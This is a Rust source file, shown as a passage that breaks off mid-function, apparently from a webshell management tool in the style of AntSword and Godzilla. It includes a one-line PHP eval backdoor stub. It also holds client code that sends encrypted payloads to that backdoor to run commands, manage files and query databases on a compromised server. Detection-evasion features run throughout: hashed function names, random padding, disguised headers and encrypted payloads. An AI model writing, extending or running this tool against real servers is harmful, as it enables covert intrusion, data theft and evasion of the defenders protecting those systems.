//! 标准 PHP WebShell 协议（类蚁剑风格）。
//!
//! 服务端 stub 由用户自行部署到授权目标：
//! ```php
//! <?php @eval(@$__g[5]($_POST['x']));
//! ```
//! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
//! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
//! 所有路径 / 命令参数均以 base64 字面量嵌入代码，规避引号与转义问题。
//!
//! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。

use std::any::Any;
use std::time::Instant;

use base64::Engine;
use base64::engine::general_purpose::STANDARD as B64;
use serde_json::Value;

use dosword_sdk::domain::{
    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
    ProbeResult, ShellProfile, TargetCapabilities,
};

use super::transport::{build_client, form_escape};
use dosword_sdk::encoder::{EncoderRegistry, PayloadEncoder};
use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
use dosword_sdk::{Protocol, ProtocolError, SessionState};

pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";

/// 编码器是否启用分阶段载荷模式：`"session": true` 或编码器本身为 xor_session。
///
/// NATIVE 系列自带**内置功能分发**骨架（stub 中直接内置命令/文件函数），
/// 没有可注入处理器的 eval 通道，`stub_session()` 也只是回退为普通 stub。
/// 因此对 native* 忽略 session 开关，否则客户端会走分阶段通道向 NATIVE stub
/// 发裸密文请求体（stub 只认 `$_POST['formData']`）→ 恒定失败。
fn session_mode_for(protocol_params: &str, encoder: &dyn PayloadEncoder) -> bool {
    if encoder.id() == "xor_session" {
        return true;
    }
    !encoder.id().starts_with("native")
        && session_enabled(protocol_params)
        && encoder.id() != "php_stream"
}

/// 分阶段载荷（Godzilla session 模式）是否启用：protocol_params 中 `"session": true`。
fn session_enabled(protocol_params: &str) -> bool {
    serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| value.get("session").and_then(|item| item.as_bool()))
        .unwrap_or(false)
}

/// 从 `protocol_params`（JSON）解析编码器 id。
///
/// - 未配置 `encoder`：用 NATIVE_XOR（与历史行为一致）。
/// - 配置了但未注册：**报错**。旧实现会静默回退 NATIVE_XOR —— 那会把「拼错的 id」
///   变成「用一个不相干的编码器发请求」，表现为莫名其妙的解密失败；且与
///   `generate_shell` 的严格校验（未知 id 直接拒绝）不一致。
fn encoder_for(protocol_params: &str) -> Result<&'static dyn PayloadEncoder, ProtocolError> {
    let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| {
            value
                .get("encoder")
                .and_then(|item| item.as_str().map(str::to_string))
        });
    match encoder_id.as_deref() {
        Some(id) => EncoderRegistry::global().get(id).ok_or_else(|| {
            ProtocolError::NotSupported(format!(
                "未注册的编码器 {id}：请重新生成 Shell，或修正 Shell 配置中的 encoder"
            ))
        }),
        None => Ok(&dosword_sdk::encoder::NATIVE_XOR),
    }
}

/// 有效密码：协议参数里带 `salt` 时用 `salt:password` 派生密钥与令牌，
/// 与 `generate_shell` 的加盐 stub 保持一致；未带盐时等于原密码。
/// 按编码器建立 AEAD 会话状态（非 AEAD 编码器返回 None）。
fn aead_state(
    encoder: &dyn PayloadEncoder,
    password: &str,
) -> Option<std::sync::Mutex<dosword_sdk::aead::AeadSession>> {
    if encoder.id() == "native_aead" {
        Some(std::sync::Mutex::new(dosword_sdk::aead::AeadSession::new(
            password,
        )))
    } else {
        None
    }
}

/// 统一编码入口：AEAD 走带序号的会话状态，其余走编码器本身。
fn encode_payload(php: &PhpSession, plaintext: &str) -> Result<String, ProtocolError> {
    match &php.aead {
        Some(aead) => aead
            .lock()
            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
            .seal(plaintext.as_bytes())
            .map_err(ProtocolError::ParseError),
        None => Ok(php.encoder.encode(plaintext, &php.password)),
    }
}

/// 统一解码入口（响应方向；AEAD 会校验 tag 与序号窗口）。
fn decode_payload(php: &PhpSession, payload: &str) -> Result<Vec<u8>, ProtocolError> {
    match &php.aead {
        Some(aead) => aead
            .lock()
            .map_err(|_| ProtocolError::ParseError("AEAD 状态锁异常".into()))?
            .open(payload)
            .map_err(ProtocolError::ParseError),
        None => php.encoder.decode(payload, &php.password),
    }
}

/// 头鉴权令牌：AEAD 用密钥派生的令牌，其余沿用 md5(password)[..16]。
fn auth_token(php: &PhpSession) -> String {
    match &php.aead {
        Some(aead) => aead
            .lock()
            .map(|session| session.token().to_string())
            .unwrap_or_default(),
        None => dosword_sdk::encoder::md5_hex(&php.password)[..16].to_string(),
    }
}

fn effective_password(protocol_params: &str, password: &str) -> String {
    let salt = serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| {
            value
                .get("salt")
                .and_then(|item| item.as_str().map(str::to_string))
        })
        .filter(|salt| !salt.is_empty());
    match salt {
        Some(salt) => format!("{salt}:{password}"),
        None => password.to_string(),
    }
}

impl ProtocolPlugin for PhpProtocol {
    fn manifest(&self) -> PluginManifest {
        PluginManifest {
            id: PHP_PROTOCOL_ID.to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: PluginKind::Protocol,
            description: "标准 PHP WebShell（类蚁剑）：命令执行、文件管理、数据库操作。"
                .to_string(),
            capabilities: vec![
                "files".to_string(),
                "terminal".to_string(),
                "database".to_string(),
            ],
        }
    }
}

/// 每 Shell 的传输形态（W2）。字段全部可选，缺省即历史行为。
///
/// 存在 `protocol_params.transport` 里（无需 DB 迁移）：
/// ```json
/// { "param": "sess", "header": "X-Token",
///   "extraHeaders": {"X-Requested-With": "XMLHttpRequest"},
///   "pathSuffix": "?v=1", "padding": 16 }
/// ```
/// `param` / `header` 必须与 stub 生成时的配置一致（NATIVE 通道把它们烘焙进 stub）；
/// 其余字段只影响客户端请求形态。
#[derive(Debug, Clone, Default)]
pub struct TransportProfile {
    /// NATIVE 通道的请求参数名（默认 `formData`）。
    pub param: Option<String>,
    /// NATIVE 通道的鉴权头名（默认 `X-Debug-Key`）。
    pub header: Option<String>,
    /// 附加请求头（所有通道）。
    pub extra_headers: Vec<(String, String)>,
    /// 附加到 endpoint 的查询串（如 `?v=1`）。
    pub path_suffix: String,
    /// 表单体随机填充字节数（NATIVE / legacy 表单通道；上限 4096）。
    pub padding: usize,
}

impl TransportProfile {
    /// 从 `protocol_params` 解析；缺省/空值 → 历史行为。非法配置直接报错。
    pub fn from_protocol_params(raw: &str) -> Result<Self, ProtocolError> {
        let Ok(value) = serde_json::from_str::<Value>(raw) else {
            return Ok(Self::default());
        };
        let Some(transport) = value.get("transport") else {
            return Ok(Self::default());
        };
        let Some(obj) = transport.as_object() else {
            return Err(ProtocolError::NotSupported(
                "protocol_params.transport 必须是 JSON 对象".into(),
            ));
        };
        let text = |key: &str| {
            obj.get(key)
                .and_then(|item| item.as_str())
                .map(str::to_string)
                .filter(|item| !item.is_empty())
        };
        let mut extra_headers = Vec::new();
        if let Some(map) = obj.get("extraHeaders") {
            let Some(map) = map.as_object() else {
                return Err(ProtocolError::NotSupported(
                    "transport.extraHeaders 必须是对象".into(),
                ));
            };
            for (name, value) in map {
                let Some(value) = value.as_str() else {
                    return Err(ProtocolError::NotSupported(format!(
                        "transport.extraHeaders.{name} 必须是字符串"
                    )));
                };
                extra_headers.push((name.clone(), value.to_string()));
            }
        }
        let padding = obj
            .get("padding")
            .and_then(|item| item.as_u64())
            .unwrap_or(0) as usize;
        let profile = Self {
            param: text("param"),
            header: text("header"),
            extra_headers,
            path_suffix: text("pathSuffix").unwrap_or_default(),
            padding,
        };
        profile.validate()?;
        Ok(profile)
    }

    /// 校验：参数名 / 头名 / 额外头 / 查询串 / 填充长度。
    ///
    /// 头名与头值严格拒绝 CRLF —— 配置来自持久化的 Shell 档案，
    /// 不能成为请求头注入的入口。
    pub fn validate(&self) -> Result<(), ProtocolError> {
        if let Some(param) = self.param.as_deref() {
            dosword_sdk::encoder::validate_php_ident("请求参数名", param)?;
        }
        if let Some(header) = self.header.as_deref() {
            dosword_sdk::encoder::validate_http_header(header)?;
        }
        for (name, value) in &self.extra_headers {
            dosword_sdk::encoder::validate_http_header(name)?;
            if value.contains('\r') || value.contains('\n') {
                return Err(ProtocolError::NotSupported(format!(
                    "额外请求头 {name} 的值不得包含换行"
                )));
            }
            if value.len() > 1024 {
                return Err(ProtocolError::NotSupported(format!(
                    "额外请求头 {name} 的值过长（上限 1024）"
                )));
            }
        }
        if !self.path_suffix.is_empty() {
            let valid = self.path_suffix.len() <= 256
                && (self.path_suffix.starts_with('?') || self.path_suffix.starts_with('&'))
                && !self
                    .path_suffix
                    .chars()
                    .any(|ch| ch.is_whitespace() || ch == '#');
            if !valid {
                return Err(ProtocolError::NotSupported(format!(
                    "transport.pathSuffix 不合法：{}（需以 ? 或 & 开头，不含空白与 #，长度 ≤ 256）",
                    self.path_suffix
                )));
            }
        }
        if self.padding > 4096 {
            return Err(ProtocolError::NotSupported(
                "transport.padding 过大（上限 4096 字节）".into(),
            ));
        }
        Ok(())
    }

    /// 实际请求 URL（endpoint + 查询串）。
    pub fn url(&self, endpoint: &str) -> String {
        format!("{endpoint}{}", self.path_suffix)
    }
}

/// 给表单体追加随机填充字段（W2：传输形态）。
///
/// 不改动载荷语义（stub 忽略未知字段），只改变请求的字节形态。
fn append_padding(body: &mut String, bytes: usize) {
    if bytes == 0 {
        return;
    }
    let mut buf = vec![0u8; bytes.min(4096)];
    if getrandom::fill(&mut buf).is_err() {
        for (index, byte) in buf.iter_mut().enumerate() {
            *byte = (index as u8).wrapping_mul(31).wrapping_add(7);
        }
    }
    let value: String = buf.iter().map(|byte| format!("{byte:02x}")).collect();
    let name: String = format!("p{}", &value[..value.len().min(16)]);
    body.push('&');
    body.push_str(&name);
    body.push('=');
    body.push_str(&value);
}

/// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
pub struct PhpSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
    /// 载荷编码器（连接时由 protocol_params 决定）。
    pub encoder: &'static dyn PayloadEncoder,
    /// Godzilla 分阶段载荷：处理器代码是否已注入服务端 session。
    pub initialized: std::sync::Mutex<bool>,
    /// 分阶段载荷模式（protocol_params 中 session: true 且编码器支持）。
    pub session_mode: bool,
    /// stub 是否上报 `ChunkedTransfer` 能力（read/write 支持 o/l 偏移）。
    ///
    /// 旧版 stub 的 read 会忽略偏移并返回**整文件**、write 会从头覆写——
    /// 分块传输必须据此拒绝，否则会退化为"无限下载写满磁盘"或"静默截断覆盖"。
    pub chunked: bool,
    /// 会话当前工作目录（cd 支持：每次命令前 stub 端 chdir）。
    pub cwd: std::sync::Mutex<String>,
    /// AEAD 会话状态（仅 `native_aead`）：发送序号 + 接收滑动窗口。
    pub aead: Option<std::sync::Mutex<dosword_sdk::aead::AeadSession>>,
    /// 目标 stub 上报的能力（`None` = 旧 stub 未上报 → 保持 v1 行为，不做拒绝）。
    ///
    /// 门禁语义见 `require_capability`：**只有明确上报且缺项时才拒绝**，
    /// 避免把「旧 stub 没这个字段」误判成「不支持」。
    pub capabilities: Option<TargetCapabilities>,
    /// 传输形态（W2）：参数名 / 头名 / 额外头 / 查询串 / 填充。
    pub transport: TransportProfile,
}

/// 能力门禁：仅当 stub **明确上报**了能力清单且其中不含目标能力时拒绝。
///
/// `None`（旧 stub 未上报 `ProtoVersion`）→ 保持 v1 旧行为，不做任何拒绝：
/// 老 stub 仍能连、仍能用，只是享受不到新能力（例如 gzip 不会被启用）。
/// 这与 `docs/现代化方案.md` 的兼容策略一致。
fn require_capability(php: &PhpSession, capability: &str) -> Result<(), ProtocolError> {
    if let Some(caps) = php.capabilities.as_ref()
        && !caps.supports(capability)
    {
        return Err(ProtocolError::NotSupported(format!(
            "目标 stub 未上报 {capability} 能力：请用当前版本重新生成并上传 stub"
        )));
    }
    Ok(())
}

impl PhpSession {
    /// 当前会话工作目录。
    fn current_dir(&self) -> String {
        self.cwd.lock().map(|c| c.clone()).unwrap_or_default()
    }

    /// 更新会话工作目录（命令响应回传）。
    fn update_cwd(&self, cwd: &str) {
        if !cwd.is_empty()
            && let Ok(mut slot) = self.cwd.lock()
        {
            *slot = cwd.to_string();
        }
    }
}

impl SessionState for PhpSession {
    fn as_any(&self) -> &dyn Any {
        self
    }
}

/// PHP 协议实例（无状态单例）。
pub struct PhpProtocol;

/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// 所有操作代码都拼接在它之后，并以 `{NONCE}` 帧收尾。
/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// `{PARAM_K}` 为密码参数名（业务伪装模板为 token，标准模板为 k）。
const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}"#;

/// 每个操作的公共收尾：输出 nonce 帧。
/// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
const TEMPLATE_FRAME: &str =
    r#"echo '{NONCE}'.(isset($__g[6])?@$__g[6](json_encode($__r)):'').'{NONCE}';"#;

/// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
const TEMPLATE_FRAME_DIE: &str =
    r#"echo '{NONCE}'.(isset($__g[6])?@$__g[6](json_encode($__r)):'').'{NONCE}';die;"#;

/// 校验驱动落在白名单内（防止把任意字符串当驱动传给目标）。
fn check_driver(driver: &str) -> Result<(), ProtocolError> {
    if DB_DRIVERS.contains(&driver) {
        return Ok(());
    }
    Err(ProtocolError::NotSupported(format!(
        "不支持的数据库驱动：{driver}（支持 {}）",
        DB_DRIVERS.join(" / ")
    )))
}

/// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
const DB_DRIVERS: [&str; 6] = ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"];

// ---------------------------------------------------------------------------
// 请求调试：统一走 protocol::reqlog（环缓冲，密码脱敏，记录全部协议帧）。
// PHP 协议在此登记为 builtin.php.v1；JSP/ASP/Python/Node 在 jsp.rs 登记。
// ---------------------------------------------------------------------------

impl PhpProtocol {
    // --- Godzilla 分阶段载荷操作（xor_session） ---

    /// P3：probe 内部实现，client 可复用（connect 传入已建 client，避免重复建连接池）。
    fn probe_impl(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
        reused_client: Option<&reqwest::blocking::Client>,
    ) -> Result<ProbeResult, ProtocolError> {
        // 环境信息探测：不产生任何文件系统副作用
        let encoder = encoder_for(&profile.protocol_params)?;
        if encoder.id().starts_with("native") {
            // NATIVE 与自加密编码器恒走分阶段会话通道
            let client = match reused_client {
                Some(client) => client.clone(),
                None => build_client(settings),
            };
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: effective_password(&profile.protocol_params, &profile.password),
                client,
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: false,
                chunked: false,
                cwd: std::sync::Mutex::new(String::new()),
                aead: aead_state(
                    encoder,
                    &effective_password(&profile.protocol_params, &profile.password),
                ),
                // 探测用的临时会话：能力由 probe 响应决定，随后写回真实会话
                capabilities: None,
                transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
            };
            return self.session_probe(&php, settings);
        }
        if session_mode_for(&profile.protocol_params, encoder) {
            let client = match reused_client {
                Some(client) => client.clone(),
                None => build_client(settings),
            };
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: effective_password(&profile.protocol_params, &profile.password),
                client,
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: true,
                chunked: false,
                cwd: std::sync::Mutex::new(String::new()),
                aead: aead_state(
                    encoder,
                    &effective_password(&profile.protocol_params, &profile.password),
                ),
                capabilities: None,
                transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
            };
            return self.session_probe(&php, settings);
        }
        // info 表：能力协商（ProtoVersion/Capabilities）与内存马前置判定
        // （PHP_SAPI / user_ini_filename / DOCUMENT_ROOT）都依赖它，
        // 旧实现只回 9 个扁平字段，导致 legacy 通道「看起来不支持任何能力」。
        // 能力串去掉 batch / gzip_plain：
        let effective = effective_password(&profile.protocol_params, &profile.password);
        let code = Self::legacy_probe_code(encoder, &effective);
        let client = match reused_client {
            Some(client) => client.clone(),
            None => build_client(settings),
        };
        // 旧 stub 兼容：临时会话（transport 由 protocol_params 决定）
        let php = PhpSession {
            endpoint: profile.endpoint.clone(),
            // 加盐 stub 必须用派生后的有效密码（此前 legacy 探针漏了这一步，
            // 导致「加盐 + legacy 编码器」在探测阶段就鉴权失败）
            password: effective,
            client,
            encoder,
            initialized: std::sync::Mutex::new(false),
            session_mode: false,
            chunked: false,
            cwd: std::sync::Mutex::new(String::new()),
            aead: None,
            capabilities: None,
            transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
        };
        let value = self.send_frame(&php, &code, settings, "probe")?;

        let server = value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let web_server = value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let runtime = value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let current_dir = value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let separator = value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string();
        let php_sapi = value
            .pointer("/data/php_sapi")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let arch = value
            .pointer("/data/arch")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let extensions = value
            .pointer("/data/extensions")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        let disable_functions = value
            .pointer("/data/disable_functions")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let info = info_map(&value);
        Ok(ProbeResult {
            status: "online".to_string(),
            server,
            web_server,
            runtime,
            current_dir,
            separator,
            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
            php_sapi,
            arch,
            extensions,
            disable_functions,
            // 能力协商：新 stub 上报 ProtoVersion/Capabilities，旧 stub 为 None
            capabilities: TargetCapabilities::from_info(&info),
            info,
        })
    }

    fn session_probe(
        &self,
        php: &PhpSession,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        let value = dispatch(php, "probe", &[], settings)?;
        let get = |key: &str| -> String {
            value
                .pointer(&format!("/data/{key}"))
                .and_then(|v| v.as_str())
                .unwrap_or("未知")
                .to_string()
        };
        // 能力协商：分阶段处理器的 probe 也上报 ProtoVersion/Capabilities
        let info = info_map(&value);
        Ok(ProbeResult {
            status: "online".to_string(),
            server: get("server"),
            web_server: get("web_server"),
            runtime: get("php_version"),
            current_dir: get("current_dir"),
            separator: get("separator"),
            message: "分阶段载荷探测成功。".to_string(),
            php_sapi: get("php_sapi"),
            arch: get("arch"),
            extensions: value
                .pointer("/data/extensions")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default(),
            disable_functions: get("disable_functions"),
            capabilities: TargetCapabilities::from_info(&info),
            info,
        })
    }

    fn session_exec(
        &self,
        php: &PhpSession,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let start = Instant::now();
        let w = php.current_dir();
        let value = dispatch(php, "exec", &[("c", command), ("w", &w)], settings)?;
        let duration_ms = start.elapsed().as_millis() as u64;
        let raw = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok());
        let stdout = raw
            .as_deref()
            .and_then(|bytes| String::from_utf8(bytes.to_vec()).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        if let Some(ref c) = cwd {
            php.update_cwd(c);
        }
        Ok(CommandOutput {
            stdout,
            duration_ms,
            cwd,
            raw_b64: raw.map(|bytes| B64.encode(bytes)),
        })
    }

    fn session_list_dir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let value = dispatch(php, "list", &[("p", path)], settings)?;
        Ok(DirListing {
            entries: parse_entries(&value),
        })
    }

    fn session_read_file(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let value = dispatch(php, "read", &[("p", path)], settings)?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn session_write_file(
        &self,
        php: &PhpSession,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(
            php,
            "write",
            &[("p", path), ("d", &B64.encode(content))],
            settings,
        )?;
        Ok(())
    }

    fn session_delete(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "delete", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_rename(
        &self,
        php: &PhpSession,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "rename", &[("f", from), ("t", to)], settings)?;
        Ok(())
    }

    fn session_mkdir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "mkdir", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_touch(
        &self,
        php: &PhpSession,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(
            php,
            "touch",
            &[("p", path), ("t", &timestamp.to_string())],
            settings,
        )?;
        Ok(())
    }

    fn session_db_probe(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let value = dispatch(php, "dbprobe", &[("c", &conn_json(connection))], settings)?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver: connection.driver.clone(),
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn session_db_query(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let value = dispatch(
            php,
            "dbquery",
            &[("c", &conn_json(connection)), ("q", sql)],
            settings,
        )?;
        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms: 0,
        })
    }

    /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
    fn build_code(template: &str, params: &[(&str, &str)]) -> String {
        let mut code = template.to_string();
        for (key, value) in params {
            code = code.replace(&format!("{{{key}}}"), value);
        }
        code
    }

    /// 构建鉴权前缀（密码参数名随编码器业务伪装模板变化：token / k）。
    /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
    /// legacy 通道的环境探测代码（连接探测与心跳共用）。
    ///
    /// 能力串去掉 batch / gzip_plain：
    /// - legacy 的请求由**已部署的 stub** 解包，旧 stub 不会 gunzip；
    ///   且逐请求代码没有统一分发器，无法一次往返跑多个操作。
    fn legacy_probe_code(encoder: &dyn PayloadEncoder, password: &str) -> String {
        let info = dosword_sdk::php_impl::PHP_INFO_IMPL.replace(
            "chunked,stream,db,plugin,exec,batch,gzip_plain",
            "chunked,stream,db,plugin,exec",
        );
        format!(
            "{}\n{}\n$__r=array('ok'=>true,'data'=>array('server'=>$info['OsInfo'],'web_server'=>$info['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>@getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>$info['ProcessArch'],'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>$info['disable_functions'],'info'=>$info));{}",
            Self::build_prefix(encoder, password),
            info,
            TEMPLATE_FRAME
        )
    }

    fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
        if encoder.body_mode() {
            // 请求体直传（php_stream）：代码作为完整 PHP 文件执行，同样自带符号表
            return format!(
                "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);\n{}",
                dosword_sdk::php_impl::php_symbol_table("$__g")
            );
        }
        let (key_param, _) = encoder.form_params();
        // 逐请求代码自带运行时符号表：敏感函数名只以 crc32b 哈希出现在载荷里。
        // （目标上已部署的 legacy stub 只有 `$_g` 且索引各不相同，不能复用。）
        format!(
            "{}\n{}",
            Self::build_code(
                TEMPLATE_PREFIX,
                &[
                    ("PARAM_K", key_param),
                    (
                        "PWD",
                        &crate::protocol::transport::php_single_quote(password),
                    ),
                ],
            ),
            dosword_sdk::php_impl::php_symbol_table("$__g")
        )
    }

    /// 发送一次协议请求并解析 nonce 帧，返回业务 JSON 值。
    ///
    /// 帧协议：调用方生成的 `code` 中必须包含 `echo '{nonce}';`（nonce 由本方法
    /// 随机生成并替换 `{NONCE}` 占位符），服务器会原样回显该 nonce，响应中
    /// 两个 nonce 之间的部分即协议帧。
    #[allow(clippy::too_many_arguments)] // 帧协议字段固定，拆结构体反而增加调用方噪声
    fn send_frame(
        &self,
        php: &PhpSession,
        code_template: &str,
        settings: &AppSettings,
        action: &str,
    ) -> Result<Value, ProtocolError> {
        // 8 字节随机 nonce（hex 字符串）
        let nonce = random_nonce();
        let start = Instant::now();
        let code = code_template.replace("{NONCE}", &nonce);

        let encoder = php.encoder;
        let password = php.password.as_str();
        // 按编码器编码载荷（与服务端 stub 的解码逻辑对应）
        // body 模式（如 php_stream）：载荷直传请求体，stub 用 include 流执行；
        // 表单模式：POST k（密码）+ x（编码后载荷）。
        let mut body = if encoder.body_mode() {
            encoder.encode(&code, password)
        } else {
            let (key_param, data_param) = encoder.form_params();
            let payload = encoder.encode(&code, password);
            format!(
                "{key_param}={}&{data_param}={}",
                form_escape(password),
                form_escape(&payload)
            )
        };
        // W2：表单体随机填充（stub 忽略未知字段）；请求体直传模式不填充
        if !encoder.body_mode() {
            append_padding(&mut body, php.transport.padding);
        }

        // W2：查询串 + 额外请求头
        let url = php.transport.url(&php.endpoint);
        let mut request = php
            .client
            .post(&url)
            .header("Content-Type", "application/x-www-form-urlencoded");
        for (name, value) in &php.transport.extra_headers {
            request = request.header(name, value);
        }
        let response = request
            .body(body)
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;

        let status = response.status();
        let duration_ms = start.elapsed().as_millis() as u64;

        if !status.is_success() {
            return Err(ProtocolError::HttpStatus(
                status.as_u16(),
                status.canonical_reason().unwrap_or("").to_string(),
            ));
        }

        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        let bytes = crate::protocol::transport::read_limited(response, max_bytes)
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        let text = String::from_utf8_lossy(&bytes);

        // 调试记录（先于错误分支，失败请求同样留痕）——统一 reqlog 模块
        crate::protocol::reqlog::record_request(
            PHP_PROTOCOL_ID,
            action,
            &php.endpoint,
            status.as_u16(),
            duration_ms,
            &code,
            &text,
            &php.password,
        );

        // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
        if text.contains("AUTH_FAIL") {
            return Err(ProtocolError::AuthFailed(
                "密码错误，服务器拒绝鉴权".to_string(),
            ));
        }

        // 按 nonce 帧定位响应体（帧外杂散输出天然免疫）
        let start = text.find(&nonce).ok_or_else(|| {
            ProtocolError::ParseError(
                "响应中未找到协议帧（请确认目标运行的是标准 PHP 协议 stub）".to_string(),
            )
        })?;
        let tail = &text[start + nonce.len()..];
        let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
            "协议帧不完整（响应被截断）".to_string(),
        ))?;
        let payload = &tail[..end];

        let decoded = B64
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
        let value: Value = serde_json::from_slice(&decoded)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;

        if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
            let error = value
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("未知错误")
                .to_string();
            return Err(ProtocolError::ServerError(error));
        }

        Ok(value)
    }
}

/// 8 字节真随机 nonce（hex 字符串），用于帧定位与防注入。
fn random_nonce() -> String {
    let mut bytes = [0u8; 8];
    // 随机源失败时退化为时间戳低位，仍能保证帧唯一性（仅防注入强度降低）
    if getrandom::fill(&mut bytes).is_err() {
